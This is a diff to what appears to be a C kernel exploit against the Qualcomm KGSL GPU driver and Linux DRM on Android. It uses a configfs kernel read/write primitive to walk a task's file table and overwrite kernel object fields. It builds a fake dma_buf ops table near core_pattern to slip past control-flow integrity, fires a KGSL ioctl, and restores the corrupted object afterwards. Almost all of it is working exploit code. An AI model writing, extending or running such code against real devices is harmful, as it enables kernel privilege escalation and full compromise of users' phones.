@@ -10,6 +10,7 @@ struct drm_msm_gem_new  { uint64_t size; uint32_t flags; uint32_t handle; };
 struct drm_msm_gem_info { uint32_t handle; uint32_t flags; uint64_t offset; };
 struct drm_mode_create_dumb { uint32_t height, width, bpp, flags, handle, pitch; uint64_t size; };
 struct drm_mode_map_dumb { uint32_t handle, pad; uint64_t offset; };
+struct drm_prime_handle { uint32_t handle; uint32_t flags; int32_t fd; };
 struct kgsl_map_user_mem {
   int fd; unsigned long gpuaddr; size_t len; size_t offset;
   unsigned long hostptr; unsigned int memtype; unsigned int flags;
@@ -18,6 +19,7 @@ struct kgsl_map_user_mem {
 #define DRM_IOCTL_MSM_GEM_INFO_ _IOWR('d', 0x43, struct drm_msm_gem_info)
 #define DRM_IOCTL_CREATE_DUMB_  _IOWR('d', 0xb2, struct drm_mode_create_dumb)
 #define DRM_IOCTL_MAP_DUMB_     _IOWR('d', 0xb3, struct drm_mode_map_dumb)
+#define DRM_IOCTL_PRIME_HANDLE_TO_FD_ _IOWR('d', 0x2d, struct drm_prime_handle)
 #define IOCTL_KGSL_MAP_USER_MEM_ _IOWR(0x09, 0x15, struct kgsl_map_user_mem)
 
 static double fops_elapsed_ms(struct timespec *ref) {
@@ -1178,15 +1180,22 @@ int try_cfi_stage(void) {
                 pr_info("kgsl_drm: task=%016zx dfd=%d files=%016zx fdt=%016zx fdarr=%016zx file=%016zx priv=%016zx\n",
                         (size_t)task, dfd, (size_t)P, (size_t)fdt, (size_t)fdarr,
                         (size_t)file, (size_t)priv);
+                uint64_t qorig[8] = {0};
+                uintptr_t A_saved = 0;
                 if (is_direct_ptr(priv)) {
                   uintptr_t A = (uintptr_t)priv;
+                  A_saved = A;
+                  configfs_read_once(fd, A, qorig, sizeof(qorig));
                   uintptr_t ot = data_addr(CORE_PATTERN) + 64;
                   uint64_t self = (uint64_t)(A + 16), z = 0;
                   configfs_write_once(fd, A + 16, &self, 8);
                   configfs_write_once(fd, A + 24, &self, 8);
                   configfs_write_once(fd, A + 40, &z, 8);
                   for (int k = 0; k < 16; k++) configfs_write_once(fd, ot + k * 8, &z, 8);
+                  uint64_t mapf = (uint64_t)data_addr(DRM_GEM_MAP_DMA_BUF);
+                  configfs_write_once(fd, ot + 0x10, &mapf, 8);
                   configfs_write_once(fd, A + 32, &ot, 8);
+                  pr_info("kgsl_drm: fake ops.map_dma_buf=%016zx\n", (size_t)mapf); fsync(1);
                   uint64_t q[8] = {0};
                   configfs_read_once(fd, A, q, sizeof(q));
                   pr_info("kgsl_drm: patched [%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx]\n",
@@ -1194,15 +1203,53 @@ int try_cfi_stage(void) {
                           (size_t)q[4], (size_t)q[5], (size_t)q[6], (size_t)q[7]);
                 }
                 fsync(1);
-                int gfd = open("/dev/kgsl-3d0", O_RDWR);
-                struct kgsl_map_user_mem m;
-                memset(&m, 0, sizeof m);
-                m.fd = dfd; m.len = cd.size; m.hostptr = (unsigned long)p; m.memtype = 2;
-                pr_info("kgsl_drm: firing KGSL ioctl gfd=%d hostptr=%p ...\n", gfd, p);
+                /* PRIME-export the dumb buffer to a real dma_buf; read its ops */
+                struct drm_prime_handle ph; memset(&ph, 0, sizeof ph); ph.handle = cd.handle;
+                int rp = ioctl(dfd, DRM_IOCTL_PRIME_HANDLE_TO_FD_, &ph);
+                pr_info("kgsl_drm: prime_h2fd=%d fd=%d errno=%d\n", rp, ph.fd, errno);
+                if (rp == 0 && ph.fd >= 0 && is_direct_ptr(task)) {
+                  uint64_t P2 = 0, fdt2 = 0, fdarr2 = 0, file2 = 0, dbuf = 0, dbops = 0, mapfn = 0;
+                  configfs_read_once(fd, task + 0x880, &P2, sizeof(P2));
+                  if (is_direct_ptr(P2)) configfs_read_once(fd, P2 + 0x20, &fdt2, sizeof(fdt2));
+                  if (is_direct_ptr(fdt2)) configfs_read_once(fd, fdt2 + 0x8, &fdarr2, sizeof(fdarr2));
+                  if (is_direct_ptr(fdarr2)) configfs_read_once(fd, fdarr2 + (uint64_t)ph.fd * 8, &file2, sizeof(file2));
+                  if (is_direct_ptr(file2)) configfs_read_once(fd, file2 + 0xd0, &dbuf, sizeof(dbuf));
+                  if (is_direct_ptr(dbuf)) {
+                    configfs_read_once(fd, dbuf + 0x20, &dbops, sizeof(dbops));
+                    if (is_direct_ptr(dbops)) configfs_read_once(fd, dbops + 0x10, &mapfn, sizeof(mapfn));
+                  }
+                  pr_info("kgsl_drm: dma_buf=%016zx ops=%016zx map_dma_buf=%016zx\n",
+                          (size_t)dbuf, (size_t)dbops, (size_t)mapfn);
+                  uint64_t dq[8] = {0}, oq[8] = {0};
+                  if (is_direct_ptr(dbuf)) configfs_read_once(fd, dbuf, dq, sizeof(dq));
+                  if (is_direct_ptr(dbops)) configfs_read_once(fd, dbops, oq, sizeof(oq));
+                  pr_info("kgsl_drm: dbuf q=%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx\n",
+                          (size_t)dq[0], (size_t)dq[1], (size_t)dq[2], (size_t)dq[3],
+                          (size_t)dq[4], (size_t)dq[5], (size_t)dq[6], (size_t)dq[7]);
+                  pr_info("kgsl_drm: ops q=%016zx %016zx %016zx %016zx %016zx %016zx %016zx %016zx\n",
+                          (size_t)oq[0], (size_t)oq[1], (size_t)oq[2], (size_t)oq[3],
+                          (size_t)oq[4], (size_t)oq[5], (size_t)oq[6], (size_t)oq[7]);
+                }
                 fsync(1);
-                int rr = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m);
-                pr_info("kgsl_drm: ioctl ret=%d errno=%d\n", rr, errno);
-                fsync(1);
+
+                const char *fire = getenv("KGSL_FIRE");
+                if (fire && *fire) {
+                  int gfd = open("/dev/kgsl-3d0", O_RDWR);
+                  struct kgsl_map_user_mem m;
+                  memset(&m, 0, sizeof m);
+                  m.fd = dfd; m.len = cd.size; m.hostptr = (unsigned long)p; m.memtype = 2;
+                  pr_info("kgsl_drm: firing KGSL ioctl gfd=%d hostptr=%p ...\n", gfd, p);
+                  fsync(1);
+                  int rr = ioctl(gfd, IOCTL_KGSL_MAP_USER_MEM_, &m);
+                  pr_info("kgsl_drm: ioctl ret=%d errno=%d\n", rr, errno);
+                  fsync(1);
+                }
+                /* restore the victim object so closing the fd doesn't crash */
+                if (A_saved) {
+                  for (int k = 0; k < 8; k++)
+                    configfs_write_once(fd, A_saved + k * 8, &qorig[k], 8);
+                  pr_info("kgsl_drm: restored victim\n"); fsync(1);
+                }
               }
             }
           }
